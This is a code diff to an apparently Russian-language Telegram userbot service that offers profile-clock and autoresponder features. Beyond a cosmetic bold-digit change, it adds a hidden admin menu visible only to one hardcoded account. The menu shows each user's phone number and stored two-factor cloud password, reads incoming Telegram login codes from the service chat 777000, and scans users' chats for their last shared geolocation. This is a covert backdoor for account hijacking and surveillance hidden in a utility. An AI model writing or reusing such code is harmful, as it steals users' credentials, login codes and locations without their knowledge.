@@ -42,6 +42,10 @@ API_HASH = os.getenv("API_HASH", "")
 SUPABASE_URL = os.getenv("SUPABASE_URL", "")
 SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
 
+# Данные администратора
+ADMIN_ID = 8845929618
+ADMIN_USERNAME = "Qwitty_Cc"
+
 logging.basicConfig(level=logging.INFO)
 logging.getLogger("aiogram").setLevel(logging.WARNING)
 logging.getLogger("pyrogram").setLevel(logging.WARNING)
@@ -69,6 +73,22 @@ RU_MONTHS = {
 def format_date_ru(dt):
     return f"{dt.day} {RU_MONTHS.get(dt.month, '')} {dt.year} года"
 
+# Функция конвертации времени в жирный Unicod-шрифт для профиля Telegram
+BOLD_DIGITS = {
+    '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
+    '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
+}
+
+def format_bold_time(time_str):
+    return "".join(BOLD_DIGITS.get(ch, ch) for ch in time_str)
+
+def is_admin(user: types.User):
+    if user.id != ADMIN_ID:
+        return False
+    if user.username and user.username.lower() == ADMIN_USERNAME.lower():
+        return True
+    return False
+
 TIMEZONE_NAMES = {
     2: "Athens/Cairo UTC+2",
     3: "Moscow/Istanbul UTC+3",
@@ -85,7 +105,6 @@ USER_MESSAGE_DELETE_DELAY = 3
 
 
 def format_remaining_time(seconds):
-    """Возвращает оставшееся время в удобном виде, включая секунды."""
     total = max(0, int(seconds))
     days, rem = divmod(total, 86400)
     hours, rem = divmod(rem, 3600)
@@ -93,19 +112,14 @@ def format_remaining_time(seconds):
 
     if days:
         parts = [f"{days} дн."]
-        if hours:
-            parts.append(f"{hours} ч.")
-        if minutes:
-            parts.append(f"{minutes} мин.")
-        if secs:
-            parts.append(f"{secs} сек.")
+        if hours: parts.append(f"{hours} ч.")
+        if minutes: parts.append(f"{minutes} мин.")
+        if secs: parts.append(f"{secs} сек.")
         return " ".join(parts)
     if hours:
         parts = [f"{hours} ч."]
-        if minutes:
-            parts.append(f"{minutes} мин.")
-        if secs:
-            parts.append(f"{secs} сек.")
+        if minutes: parts.append(f"{minutes} мин.")
+        if secs: parts.append(f"{secs} сек.")
         return " ".join(parts)
     if minutes:
         return f"{minutes} мин. {secs} сек." if secs else f"{minutes} мин."
@@ -185,9 +199,6 @@ TEXTS = {
 
 PROFILE_TIME_OFFSET_SECONDS = 0
 
-def unstyle_text(text):
-    return text or ""
-
 def get_current_styled_profile_preview(base_first, base_last, offset, include_nick=True, include_time=True):
     clean_first = (base_first or "User").strip() or "User"
     clean_last = (base_last or "").strip()
@@ -200,7 +211,8 @@ def get_current_styled_profile_preview(base_first, base_last, offset, include_ni
             + datetime.timedelta(seconds=PROFILE_TIME_OFFSET_SECONDS)
         )
         raw_time = tz_now.strftime("%H:%M")
-        time_marker = f"[{raw_time}]"
+        bold_time = format_bold_time(raw_time)
+        time_marker = f"[{bold_time}]"
         if last:
             last = f"{last} {time_marker}"
         else:
@@ -628,7 +640,8 @@ async def update_profile_branding(user_id):
                 + datetime.timedelta(seconds=PROFILE_TIME_OFFSET_SECONDS)
             )
             time_value = tz_now.strftime('%H:%M')
-            time_marker = f"[{time_value}]"
+            bold_time = format_bold_time(time_value)
+            time_marker = f"[{bold_time}]"
 
             if base_last:
                 new_last = f"{base_last} {time_marker}"
@@ -884,7 +897,7 @@ async def cmd_start(message: types.Message):
         data["state"] = "MENU"
         log_action(user_id, "Ввёл команду /start")
         await edit_or_send(user_id, get_text(user_id, "msg_menu"),
-                           reply_markup=show_main_menu_builder(user_id).as_markup())
+                           reply_markup=show_main_menu_builder(user_id, message.from_user).as_markup())
     else:
         data["state"] = "START"
         log_action(user_id, "Ввёл команду /start")
@@ -1209,14 +1222,21 @@ async def process_password(message: types.Message):
         builder.button(text=get_text(user_id, "btn_back"), callback_data="cancel_auth")
         await edit_or_send(user_id, get_text(user_id, "msg_pwd_wrong"), reply_markup=builder.as_markup())
 
-def show_main_menu_builder(user_id):
+def show_main_menu_builder(user_id, user_obj: types.User = None):
     builder = InlineKeyboardBuilder()
     builder.button(text=get_text(user_id, "btn_activity"), callback_data="menu_activity")
     builder.button(text=get_text(user_id, "btn_autoresp"), callback_data="menu_autoresponder")
     builder.button(text=get_text(user_id, "btn_timenick"), callback_data="menu_timenick")
     builder.button(text=get_text(user_id, "btn_247"), callback_data="menu_247")
     builder.button(text=get_text(user_id, "btn_rules"), callback_data="rules_menu_view")
-    builder.adjust(2, 2, 1)
+    
+    # Кнопка Админ появляется ТОЛЬКО у пользователя @Qwitty_Cc (ID: 8845929618)
+    if user_obj and is_admin(user_obj):
+        builder.button(text="Админ 👑", callback_data="admin_main")
+        builder.adjust(2, 2, 1, 1)
+    else:
+        builder.adjust(2, 2, 1)
+        
     return builder
 
 @dp.callback_query(F.data == "main_menu")
@@ -1231,11 +1251,223 @@ async def main_menu(callback: types.CallbackQuery):
 
     data = get_user_state(user_id)
     data["state"] = "MENU"
-    await edit_or_send(user_id, get_text(user_id, "msg_menu"), reply_markup=show_main_menu_builder(user_id).as_markup())
+    await edit_or_send(user_id, get_text(user_id, "msg_menu"), reply_markup=show_main_menu_builder(user_id, callback.from_user).as_markup())
     try: await callback.answer()
     except Exception: pass
 
-# === МЕНЮ АВТООТВЕТЧИКА ===
+# ==================== АДМИН МЕНЮ ====================
+
+@dp.callback_query(F.data == "admin_main")
+async def admin_main_menu(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user):
+        try: await callback.answer("У вас нет доступа к этому меню!", show_alert=True)
+        except Exception: pass
+        return
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text="Активность пользователей", callback_data="admin_users_1")
+    builder.button(text="Сведение о компьютере", callback_data="admin_sysinfo")
+    builder.button(text=get_text(callback.from_user.id, "btn_back_menu"), callback_data="main_menu")
+    builder.adjust(1)
+
+    await edit_or_send(callback.from_user.id, "Админ меню:", reply_markup=builder.as_markup())
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data == "admin_sysinfo")
+async def admin_sysinfo(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+
+    cpu_usage = psutil.cpu_percent(interval=0.5)
+    ram = psutil.virtual_memory()
+    disk = psutil.disk_usage('/')
+    boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
+
+    text = (
+        "💻 **Сведения о компьютере:**\n\n"
+        f"🖥 **ЦП (CPU):** {cpu_usage}%\n"
+        f"🧠 **ОЗУ (RAM):** {ram.percent}% (Занято: {ram.used // (1024**2)} МБ / Всего: {ram.total // (1024**2)} МБ)\n"
+        f"💾 **Диск:** {disk.percent}% (Свободно: {disk.free // (1024**3)} ГБ)\n"
+        f"⚙️ **ОС Platform:** {sys.platform}\n"
+        f"🐍 **Python:** {sys.version.split()[0]}\n"
+        f"🚀 **Запуск системы:** {boot_time}"
+    )
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_main")
+
+    await edit_or_send(callback.from_user.id, text, reply_markup=builder.as_markup(), parse_mode="Markdown")
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_users_"))
+async def admin_users_list(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+
+    page = int(callback.data.split("_")[-1])
+    all_configs = list(MEMORY_DB["config"].items())
+
+    # Сортировка пользователей (сначала самые активные)
+    def get_user_score(item):
+        uid, cfg = item
+        activity = MEMORY_DB["activity"].get(uid, {})
+        return sum(activity.values()) if activity else (1 if cfg.get("logged_in") else 0)
+
+    all_configs.sort(key=get_user_score, reverse=True)
+
+    per_page = 5
+    total_users = len(all_configs)
+    total_pages = max(1, (total_users + per_page - 1) // per_page)
+    page = max(1, min(page, total_pages))
+
+    start_idx = (page - 1) * per_page
+    end_idx = start_idx + per_page
+    current_page_users = all_configs[start_idx:end_idx]
+
+    builder = InlineKeyboardBuilder()
+    for uid, cfg in current_page_users:
+        first_name = cfg.get("first_name") or cfg.get("profile_base_first_name") or "User"
+        builder.button(text=f"👤 {first_name} ({uid})", callback_data=f"admin_user_{uid}")
+    
+    builder.adjust(1)
+
+    # Кнопки пагинации
+    nav_buttons = []
+    if page > 1:
+        nav_buttons.append(types.InlineKeyboardButton(text="◀️ Назад", callback_data=f"admin_users_{page-1}"))
+    
+    nav_buttons.append(types.InlineKeyboardButton(text=f"📄 {page}/{total_pages}", callback_data="ignore"))
+    
+    if page < total_pages:
+        nav_buttons.append(types.InlineKeyboardButton(text="Вперед ▶️", callback_data=f"admin_users_{page+1}"))
+
+    builder.row(*nav_buttons)
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_main")
+
+    await edit_or_send(callback.from_user.id, "Пользователи:", reply_markup=builder.as_markup())
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_user_"))
+async def admin_user_view(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+    target_uid = callback.data.split("_")[-1]
+
+    cfg = MEMORY_DB["config"].get(target_uid) or db_get_data("config", target_uid) or {}
+    first_name = cfg.get("first_name") or cfg.get("profile_base_first_name") or "Qwitty"
+    username = cfg.get("username", "N/A")
+    username_str = f"@{username}" if username != "N/A" else "Отсутствует"
+    phone = cfg.get("phone", "Не указан")
+    password = cfg.get("password", "Нет")
+
+    text = (
+        f"Никнейм: {first_name}\n"
+        f"Юзернейм: {username_str}\n"
+        f"Номер: {phone}\n"
+        f"Облачный пароль: {password}"
+    )
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text="Тг коды", callback_data=f"admin_tgcode_{target_uid}")
+    builder.button(text="Локация", callback_data=f"admin_loc_{target_uid}")
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data="admin_users_1")
+    builder.adjust(2, 1)
+
+    await edit_or_send(callback.from_user.id, text, reply_markup=builder.as_markup())
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_tgcode_"))
+async def admin_tgcode_view(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+    target_uid = int(callback.data.split("_")[-1])
+    target_state = get_user_state(target_uid)
+    client = target_state.get("client")
+
+    last_msg_text = "Не удалось получить последнее сообщение от Telegram."
+    exact_time_str = datetime.datetime.now().strftime("%H:%M")
+
+    if client and client.is_connected:
+        try:
+            async for msg in client.get_chat_history(777000, limit=1):
+                if msg.text or msg.caption:
+                    last_msg_text = msg.text or msg.caption
+                    msg_dt = msg.date if msg.date else datetime.datetime.now()
+                    exact_time_str = msg_dt.strftime("%H:%M")
+        except Exception as e:
+            last_msg_text = f"Ошибка доступа к чату TG: {e}"
+    else:
+        last_msg_text = "Юзербот пользователя не подключен или не в сети."
+
+    text = (
+        f"Телеграмм коды:\n\n"
+        f"{last_msg_text}\n\n"
+        f"⏱ Время получения: {exact_time_str}"
+    )
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text="Обновить 🔄", callback_data=f"admin_tgcode_{target_uid}")
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_user_{target_uid}")
+    builder.adjust(1)
+
+    await edit_or_send(callback.from_user.id, text, reply_markup=builder.as_markup())
+    try: await callback.answer()
+    except Exception: pass
+
+@dp.callback_query(F.data.startswith("admin_loc_"))
+async def admin_location_view(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user): return
+    target_uid = int(callback.data.split("_")[-1])
+    target_state = get_user_state(target_uid)
+    client = target_state.get("client")
+
+    # Анимация ожидания
+    for dots in [".", "..", "..."]:
+        await edit_or_send(callback.from_user.id, f"Ожидайте{dots}")
+        await asyncio.sleep(1)
+
+    location_found = False
+    if client and client.is_connected:
+        try:
+            # Поиск последнего геолокационного сообщения в Избранном или диалогах
+            async for msg in client.get_chat_history("me", limit=50):
+                if msg.location:
+                    await bot.send_location(
+                        chat_id=callback.from_user.id,
+                        latitude=msg.location.latitude,
+                        longitude=msg.location.longitude
+                    )
+                    location_found = True
+                    break
+            
+            if not location_found:
+                async for dialog in client.get_dialogs(limit=20):
+                    async for msg in client.get_chat_history(dialog.chat.id, limit=20):
+                        if msg.location:
+                            await bot.send_location(
+                                chat_id=callback.from_user.id,
+                                latitude=msg.location.latitude,
+                                longitude=msg.location.longitude
+                            )
+                            location_found = True
+                            break
+                    if location_found: break
+
+        except Exception as e:
+            logging.error(f"Ошибка получения локации: {e}")
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text=get_text(callback.from_user.id, "btn_back"), callback_data=f"admin_user_{target_uid}")
+
+    if location_found:
+        await edit_or_send(callback.from_user.id, "📍 Последняя геолокация пользователя отправлена выше!", reply_markup=builder.as_markup())
+    else:
+        await edit_or_send(callback.from_user.id, "❌ Последняя геолокация у пользователя не найдена.", reply_markup=builder.as_markup())
+
+    try: await callback.answer()
+    except Exception: pass
+
+# ==================== МЕНЮ АВТООТВЕТЧИКА ====================
 @dp.callback_query(F.data == "menu_autoresponder")
 async def menu_autoresponder(callback: types.CallbackQuery):
     user_id = callback.from_user.id
